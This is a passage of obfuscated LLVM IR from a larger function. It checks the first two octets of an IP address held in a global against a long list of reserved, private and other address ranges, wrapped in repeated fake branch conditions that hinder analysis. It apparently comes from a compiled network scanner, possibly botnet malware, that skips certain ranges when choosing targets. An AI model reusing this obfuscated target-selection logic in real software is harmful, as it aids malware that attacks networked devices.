  br i1 %881, label %5042, label %882

; <label>:882:                                    ; preds = %878, %874
  %883 = load i32, i32* @x.71
  %884 = load i32, i32* @y.72
  %885 = sub i32 %883, 1
  %886 = mul i32 %883, %885
  %887 = urem i32 %886, 2
  %888 = icmp eq i32 %887, 0
  %889 = icmp slt i32 %884, 10
  %890 = or i1 %888, %889
  br i1 %890, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %882
  %891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %892 = zext i8 %891 to i32
  %893 = icmp eq i32 %892, 207
  %894 = load i32, i32* @x.71
  %895 = load i32, i32* @y.72
  %896 = sub i32 %894, 1
  %897 = mul i32 %894, %896
  %898 = urem i32 %897, 2
  %899 = icmp eq i32 %898, 0
  %900 = icmp slt i32 %895, 10
  %901 = or i1 %899, %900
  br i1 %901, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %893, label %902, label %906

; <label>:902:                                    ; preds = %originalBBpart2120
  %903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %904 = zext i8 %903 to i32
  %905 = icmp eq i32 %904, 120
  br i1 %905, label %5042, label %906

; <label>:906:                                    ; preds = %902, %originalBBpart2120
  %907 = load i32, i32* @x.71
  %908 = load i32, i32* @y.72
  %909 = sub i32 %907, 1
  %910 = mul i32 %907, %909
  %911 = urem i32 %910, 2
  %912 = icmp eq i32 %911, 0
  %913 = icmp slt i32 %908, 10
  %914 = or i1 %912, %913
  br i1 %914, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %906
  %915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %916 = zext i8 %915 to i32
  %917 = icmp eq i32 %916, 209
  %918 = load i32, i32* @x.71
  %919 = load i32, i32* @y.72
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %917, label %926, label %930

; <label>:926:                                    ; preds = %originalBBpart2124
  %927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %928 = zext i8 %927 to i32
  %929 = icmp eq i32 %928, 35
  br i1 %929, label %5042, label %930

; <label>:930:                                    ; preds = %926, %originalBBpart2124
  %931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %932 = zext i8 %931 to i32
  %933 = icmp eq i32 %932, 64
  br i1 %933, label %934, label %954

; <label>:934:                                    ; preds = %930
  %935 = load i32, i32* @x.71
  %936 = load i32, i32* @y.72
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %934
  %943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %944 = zext i8 %943 to i32
  %945 = icmp eq i32 %944, 70
  %946 = load i32, i32* @x.71
  %947 = load i32, i32* @y.72
  %948 = sub i32 %946, 1
  %949 = mul i32 %946, %948
  %950 = urem i32 %949, 2
  %951 = icmp eq i32 %950, 0
  %952 = icmp slt i32 %947, 10
  %953 = or i1 %951, %952
  br i1 %953, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %945, label %5042, label %954

; <label>:954:                                    ; preds = %originalBBpart2128, %930
  %955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %956 = zext i8 %955 to i32
  %957 = icmp eq i32 %956, 172
  br i1 %957, label %958, label %998

; <label>:958:                                    ; preds = %954
  %959 = load i32, i32* @x.71
  %960 = load i32, i32* @y.72
  %961 = sub i32 %959, 1
  %962 = mul i32 %959, %961
  %963 = urem i32 %962, 2
  %964 = icmp eq i32 %963, 0
  %965 = icmp slt i32 %960, 10
  %966 = or i1 %964, %965
  br i1 %966, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %958
  %967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %968 = zext i8 %967 to i32
  %969 = icmp sge i32 %968, 16
  %970 = load i32, i32* @x.71
  %971 = load i32, i32* @y.72
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %969, label %978, label %998

; <label>:978:                                    ; preds = %originalBBpart2132
  %979 = load i32, i32* @x.71
  %980 = load i32, i32* @y.72
  %981 = sub i32 %979, 1
  %982 = mul i32 %979, %981
  %983 = urem i32 %982, 2
  %984 = icmp eq i32 %983, 0
  %985 = icmp slt i32 %980, 10
  %986 = or i1 %984, %985
  br i1 %986, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %978
  %987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %988 = zext i8 %987 to i32
  %989 = icmp slt i32 %988, 32
  %990 = load i32, i32* @x.71
  %991 = load i32, i32* @y.72
  %992 = sub i32 %990, 1
  %993 = mul i32 %990, %992
  %994 = urem i32 %993, 2
  %995 = icmp eq i32 %994, 0
  %996 = icmp slt i32 %991, 10
  %997 = or i1 %995, %996
  br i1 %997, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %989, label %5042, label %998

; <label>:998:                                    ; preds = %originalBBpart2136, %originalBBpart2132, %954
  %999 = load i32, i32* @x.71
  %1000 = load i32, i32* @y.72
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %998
  %1007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1008 = zext i8 %1007 to i32
  %1009 = icmp eq i32 %1008, 100
  %1010 = load i32, i32* @x.71
  %1011 = load i32, i32* @y.72
  %1012 = sub i32 %1010, 1
  %1013 = mul i32 %1010, %1012
  %1014 = urem i32 %1013, 2
  %1015 = icmp eq i32 %1014, 0
  %1016 = icmp slt i32 %1011, 10
  %1017 = or i1 %1015, %1016
  br i1 %1017, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br i1 %1009, label %1018, label %1026

; <label>:1018:                                   ; preds = %originalBBpart2140
  %1019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1020 = zext i8 %1019 to i32
  %1021 = icmp sge i32 %1020, 64
  br i1 %1021, label %1022, label %1026

; <label>:1022:                                   ; preds = %1018
  %1023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = icmp slt i32 %1024, 127
  br i1 %1025, label %5042, label %1026

; <label>:1026:                                   ; preds = %1022, %1018, %originalBBpart2140
  %1027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1028 = zext i8 %1027 to i32
  %1029 = icmp eq i32 %1028, 169
  br i1 %1029, label %1030, label %1034

; <label>:1030:                                   ; preds = %1026
  %1031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1032 = zext i8 %1031 to i32
  %1033 = icmp eq i32 %1032, 254
  br i1 %1033, label %5042, label %1034

; <label>:1034:                                   ; preds = %1030, %1026
  %1035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1036 = zext i8 %1035 to i32
  %1037 = icmp eq i32 %1036, 198
  br i1 %1037, label %1038, label %1046

; <label>:1038:                                   ; preds = %1034
  %1039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1040 = zext i8 %1039 to i32
  %1041 = icmp sge i32 %1040, 18
  br i1 %1041, label %1042, label %1046

; <label>:1042:                                   ; preds = %1038
  %1043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1044 = zext i8 %1043 to i32
  %1045 = icmp slt i32 %1044, 20
  br i1 %1045, label %5042, label %1046

; <label>:1046:                                   ; preds = %1042, %1038, %1034
  %1047 = load i32, i32* @x.71
  %1048 = load i32, i32* @y.72
  %1049 = sub i32 %1047, 1
  %1050 = mul i32 %1047, %1049
  %1051 = urem i32 %1050, 2
  %1052 = icmp eq i32 %1051, 0
  %1053 = icmp slt i32 %1048, 10
  %1054 = or i1 %1052, %1053
  br i1 %1054, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1046
  %1055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1056 = zext i8 %1055 to i32
  %1057 = icmp eq i32 %1056, 64
  %1058 = load i32, i32* @x.71
  %1059 = load i32, i32* @y.72
  %1060 = sub i32 %1058, 1
  %1061 = mul i32 %1058, %1060
  %1062 = urem i32 %1061, 2
  %1063 = icmp eq i32 %1062, 0
  %1064 = icmp slt i32 %1059, 10
  %1065 = or i1 %1063, %1064
  br i1 %1065, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1057, label %1066, label %1090

; <label>:1066:                                   ; preds = %originalBBpart2144
  %1067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = icmp sge i32 %1068, 69
  br i1 %1069, label %1070, label %1090

; <label>:1070:                                   ; preds = %1066
  %1071 = load i32, i32* @x.71
  %1072 = load i32, i32* @y.72
  %1073 = sub i32 %1071, 1
  %1074 = mul i32 %1071, %1073
  %1075 = urem i32 %1074, 2
  %1076 = icmp eq i32 %1075, 0
  %1077 = icmp slt i32 %1072, 10
  %1078 = or i1 %1076, %1077
  br i1 %1078, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1070
  %1079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1080 = zext i8 %1079 to i32
  %1081 = icmp slt i32 %1080, 227
  %1082 = load i32, i32* @x.71
  %1083 = load i32, i32* @y.72
  %1084 = sub i32 %1082, 1
  %1085 = mul i32 %1082, %1084
  %1086 = urem i32 %1085, 2
  %1087 = icmp eq i32 %1086, 0
  %1088 = icmp slt i32 %1083, 10
  %1089 = or i1 %1087, %1088
  br i1 %1089, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1081, label %5042, label %1090

; <label>:1090:                                   ; preds = %originalBBpart2148, %1066, %originalBBpart2144
  %1091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = icmp eq i32 %1092, 128
  br i1 %1093, label %1094, label %1118

; <label>:1094:                                   ; preds = %1090
  %1095 = load i32, i32* @x.71
  %1096 = load i32, i32* @y.72
  %1097 = sub i32 %1095, 1
  %1098 = mul i32 %1095, %1097
  %1099 = urem i32 %1098, 2
  %1100 = icmp eq i32 %1099, 0
  %1101 = icmp slt i32 %1096, 10
  %1102 = or i1 %1100, %1101
  br i1 %1102, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1094
  %1103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = icmp sge i32 %1104, 35
  %1106 = load i32, i32* @x.71
  %1107 = load i32, i32* @y.72
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1105, label %1114, label %1118

; <label>:1114:                                   ; preds = %originalBBpart2152
  %1115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = icmp slt i32 %1116, 237
  br i1 %1117, label %5042, label %1118

; <label>:1118:                                   ; preds = %1114, %originalBBpart2152, %1090
  %1119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1120 = zext i8 %1119 to i32
  %1121 = icmp eq i32 %1120, 129
  br i1 %1121, label %1122, label %1146

; <label>:1122:                                   ; preds = %1118
  %1123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1124 = zext i8 %1123 to i32
  %1125 = icmp sge i32 %1124, 22
  br i1 %1125, label %1126, label %1146

; <label>:1126:                                   ; preds = %1122
  %1127 = load i32, i32* @x.71
  %1128 = load i32, i32* @y.72
  %1129 = sub i32 %1127, 1
  %1130 = mul i32 %1127, %1129
  %1131 = urem i32 %1130, 2
  %1132 = icmp eq i32 %1131, 0
  %1133 = icmp slt i32 %1128, 10
  %1134 = or i1 %1132, %1133
  br i1 %1134, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1126
  %1135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = icmp slt i32 %1136, 255
  %1138 = load i32, i32* @x.71
  %1139 = load i32, i32* @y.72
  %1140 = sub i32 %1138, 1
  %1141 = mul i32 %1138, %1140
  %1142 = urem i32 %1141, 2
  %1143 = icmp eq i32 %1142, 0
  %1144 = icmp slt i32 %1139, 10
  %1145 = or i1 %1143, %1144
  br i1 %1145, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1137, label %5042, label %1146

; <label>:1146:                                   ; preds = %originalBBpart2156, %1122, %1118
  %1147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1148 = zext i8 %1147 to i32
  %1149 = icmp eq i32 %1148, 130
  br i1 %1149, label %1150, label %1174

; <label>:1150:                                   ; preds = %1146
  %1151 = load i32, i32* @x.71
  %1152 = load i32, i32* @y.72
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1150
  %1159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1160 = zext i8 %1159 to i32
  %1161 = icmp sge i32 %1160, 40
  %1162 = load i32, i32* @x.71
  %1163 = load i32, i32* @y.72
  %1164 = sub i32 %1162, 1
  %1165 = mul i32 %1162, %1164
  %1166 = urem i32 %1165, 2
  %1167 = icmp eq i32 %1166, 0
  %1168 = icmp slt i32 %1163, 10
  %1169 = or i1 %1167, %1168
  br i1 %1169, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1161, label %1170, label %1174

; <label>:1170:                                   ; preds = %originalBBpart2160
  %1171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1172 = zext i8 %1171 to i32
  %1173 = icmp slt i32 %1172, 168
  br i1 %1173, label %5042, label %1174

; <label>:1174:                                   ; preds = %1170, %originalBBpart2160, %1146
  %1175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1176 = zext i8 %1175 to i32
  %1177 = icmp eq i32 %1176, 131
  br i1 %1177, label %1178, label %1186

; <label>:1178:                                   ; preds = %1174
  %1179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1180 = zext i8 %1179 to i32
  %1181 = icmp sge i32 %1180, 3
  br i1 %1181, label %1182, label %1186

; <label>:1182:                                   ; preds = %1178
  %1183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1184 = zext i8 %1183 to i32
  %1185 = icmp slt i32 %1184, 251
  br i1 %1185, label %5042, label %1186

; <label>:1186:                                   ; preds = %1182, %1178, %1174
  %1187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1188 = zext i8 %1187 to i32
  %1189 = icmp eq i32 %1188, 132
  br i1 %1189, label %1190, label %1198

; <label>:1190:                                   ; preds = %1186
  %1191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1192 = zext i8 %1191 to i32
  %1193 = icmp sge i32 %1192, 3
  br i1 %1193, label %1194, label %1198

; <label>:1194:                                   ; preds = %1190
  %1195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1196 = zext i8 %1195 to i32
  %1197 = icmp slt i32 %1196, 251
  br i1 %1197, label %5042, label %1198

; <label>:1198:                                   ; preds = %1194, %1190, %1186
  %1199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1200 = zext i8 %1199 to i32
  %1201 = icmp eq i32 %1200, 134
  br i1 %1201, label %1202, label %1226

; <label>:1202:                                   ; preds = %1198
  %1203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1204 = zext i8 %1203 to i32
  %1205 = icmp sge i32 %1204, 5
  br i1 %1205, label %1206, label %1226

; <label>:1206:                                   ; preds = %1202
  %1207 = load i32, i32* @x.71
  %1208 = load i32, i32* @y.72
  %1209 = sub i32 %1207, 1
  %1210 = mul i32 %1207, %1209
  %1211 = urem i32 %1210, 2
  %1212 = icmp eq i32 %1211, 0
  %1213 = icmp slt i32 %1208, 10
  %1214 = or i1 %1212, %1213
  br i1 %1214, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1206
  %1215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = icmp slt i32 %1216, 235
  %1218 = load i32, i32* @x.71
  %1219 = load i32, i32* @y.72
  %1220 = sub i32 %1218, 1
  %1221 = mul i32 %1218, %1220
  %1222 = urem i32 %1221, 2
  %1223 = icmp eq i32 %1222, 0
  %1224 = icmp slt i32 %1219, 10
  %1225 = or i1 %1223, %1224
  br i1 %1225, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1217, label %5042, label %1226

; <label>:1226:                                   ; preds = %originalBBpart2164, %1202, %1198
  %1227 = load i32, i32* @x.71
  %1228 = load i32, i32* @y.72
  %1229 = sub i32 %1227, 1
  %1230 = mul i32 %1227, %1229
  %1231 = urem i32 %1230, 2
  %1232 = icmp eq i32 %1231, 0
  %1233 = icmp slt i32 %1228, 10
  %1234 = or i1 %1232, %1233
  br i1 %1234, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1226
  %1235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = icmp eq i32 %1236, 136
  %1238 = load i32, i32* @x.71
  %1239 = load i32, i32* @y.72
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1237, label %1246, label %1254

; <label>:1246:                                   ; preds = %originalBBpart2168
  %1247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1248 = zext i8 %1247 to i32
  %1249 = icmp sge i32 %1248, 177
  br i1 %1249, label %1250, label %1254

; <label>:1250:                                   ; preds = %1246
  %1251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1252 = zext i8 %1251 to i32
  %1253 = icmp slt i32 %1252, 223
  br i1 %1253, label %5042, label %1254

; <label>:1254:                                   ; preds = %1250, %1246, %originalBBpart2168
  %1255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1256 = zext i8 %1255 to i32
  %1257 = icmp eq i32 %1256, 138
  br i1 %1257, label %1258, label %1266

; <label>:1258:                                   ; preds = %1254
  %1259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1260 = zext i8 %1259 to i32
  %1261 = icmp sge i32 %1260, 13
  br i1 %1261, label %1262, label %1266

; <label>:1262:                                   ; preds = %1258
  %1263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1264 = zext i8 %1263 to i32
  %1265 = icmp slt i32 %1264, 194
  br i1 %1265, label %5042, label %1266

; <label>:1266:                                   ; preds = %1262, %1258, %1254
  %1267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = icmp eq i32 %1268, 139
  br i1 %1269, label %1270, label %1294

; <label>:1270:                                   ; preds = %1266
  %1271 = load i32, i32* @x.71
  %1272 = load i32, i32* @y.72
  %1273 = sub i32 %1271, 1
  %1274 = mul i32 %1271, %1273
  %1275 = urem i32 %1274, 2
  %1276 = icmp eq i32 %1275, 0
  %1277 = icmp slt i32 %1272, 10
  %1278 = or i1 %1276, %1277
  br i1 %1278, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1270
  %1279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1280 = zext i8 %1279 to i32
  %1281 = icmp sge i32 %1280, 31
  %1282 = load i32, i32* @x.71
  %1283 = load i32, i32* @y.72
  %1284 = sub i32 %1282, 1
  %1285 = mul i32 %1282, %1284
  %1286 = urem i32 %1285, 2
  %1287 = icmp eq i32 %1286, 0
  %1288 = icmp slt i32 %1283, 10
  %1289 = or i1 %1287, %1288
  br i1 %1289, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1281, label %1290, label %1294

; <label>:1290:                                   ; preds = %originalBBpart2172
  %1291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1292 = zext i8 %1291 to i32
  %1293 = icmp slt i32 %1292, 143
  br i1 %1293, label %5042, label %1294

; <label>:1294:                                   ; preds = %1290, %originalBBpart2172, %1266
  %1295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = icmp eq i32 %1296, 140
  br i1 %1297, label %1298, label %1322

; <label>:1298:                                   ; preds = %1294
  %1299 = load i32, i32* @x.71
  %1300 = load i32, i32* @y.72
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1298
  %1307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1308 = zext i8 %1307 to i32
  %1309 = icmp sge i32 %1308, 1
  %1310 = load i32, i32* @x.71
  %1311 = load i32, i32* @y.72
  %1312 = sub i32 %1310, 1
  %1313 = mul i32 %1310, %1312
  %1314 = urem i32 %1313, 2
  %1315 = icmp eq i32 %1314, 0
  %1316 = icmp slt i32 %1311, 10
  %1317 = or i1 %1315, %1316
  br i1 %1317, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1309, label %1318, label %1322

; <label>:1318:                                   ; preds = %originalBBpart2176
  %1319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1320 = zext i8 %1319 to i32
  %1321 = icmp slt i32 %1320, 203
  br i1 %1321, label %5042, label %1322

; <label>:1322:                                   ; preds = %1318, %originalBBpart2176, %1294
  %1323 = load i32, i32* @x.71
  %1324 = load i32, i32* @y.72
  %1325 = sub i32 %1323, 1
  %1326 = mul i32 %1323, %1325
  %1327 = urem i32 %1326, 2
  %1328 = icmp eq i32 %1327, 0
  %1329 = icmp slt i32 %1324, 10
  %1330 = or i1 %1328, %1329
  br i1 %1330, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1322
  %1331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1332 = zext i8 %1331 to i32
  %1333 = icmp eq i32 %1332, 143
  %1334 = load i32, i32* @x.71
  %1335 = load i32, i32* @y.72
  %1336 = sub i32 %1334, 1
  %1337 = mul i32 %1334, %1336
  %1338 = urem i32 %1337, 2
  %1339 = icmp eq i32 %1338, 0
  %1340 = icmp slt i32 %1335, 10
  %1341 = or i1 %1339, %1340
  br i1 %1341, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1333, label %1342, label %1366

; <label>:1342:                                   ; preds = %originalBBpart2180
  %1343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1344 = zext i8 %1343 to i32
  %1345 = icmp sge i32 %1344, 45
  br i1 %1345, label %1346, label %1366

; <label>:1346:                                   ; preds = %1342
  %1347 = load i32, i32* @x.71
  %1348 = load i32, i32* @y.72
  %1349 = sub i32 %1347, 1
  %1350 = mul i32 %1347, %1349
  %1351 = urem i32 %1350, 2
  %1352 = icmp eq i32 %1351, 0
  %1353 = icmp slt i32 %1348, 10
  %1354 = or i1 %1352, %1353
  br i1 %1354, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1346
  %1355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1356 = zext i8 %1355 to i32
  %1357 = icmp slt i32 %1356, 233
  %1358 = load i32, i32* @x.71
  %1359 = load i32, i32* @y.72
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1357, label %5042, label %1366

; <label>:1366:                                   ; preds = %originalBBpart2184, %1342, %originalBBpart2180
  %1367 = load i32, i32* @x.71
  %1368 = load i32, i32* @y.72
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1366
  %1375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1376 = zext i8 %1375 to i32
  %1377 = icmp eq i32 %1376, 144
  %1378 = load i32, i32* @x.71
  %1379 = load i32, i32* @y.72
  %1380 = sub i32 %1378, 1
  %1381 = mul i32 %1378, %1380
